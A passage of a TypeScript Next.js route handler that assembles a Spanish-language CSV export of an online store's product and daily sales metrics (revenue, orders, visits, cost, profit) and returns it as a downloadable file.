      `# Ganancia vacia = ese producto no tiene el costo cargado (no es cero)`,
      `# "Con cupon" = parte de esas ventas llevaban cupon, asi que su ganancia es en parte estimada`,
      `Producto,Unidades,Facturado (ARS),Ganancia (ARS),Con cupon`,
      ...productosCsv.map(p =>
        `${csv(p.nombre)},${p.unidades},${p.facturado},${montoOVacio(p.ganancia)},${p.conCupon ? "si" : "no"}`),
      ``,
    ] : []),

    `# DETALLE DIARIO`,
    showProfit
      ? `Fecha,Ingresos (ARS),Pedidos,Visitas,Costo (ARS),Ganancia (ARS)`
      : `Fecha,Ingresos (ARS),Pedidos,Visitas`,
    ...days.map(d => showProfit
      ? `${d.dateStr},${d.revenue},${d.orders},${d.visits},${d.cost},${d.profit}`
      : `${d.dateStr},${d.revenue},${d.orders},${d.visits}`),
  ];

  return new NextResponse(lines.join("\n"), {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="metricas-${store.slug}-${range}d.csv"`,
    },
  });
}
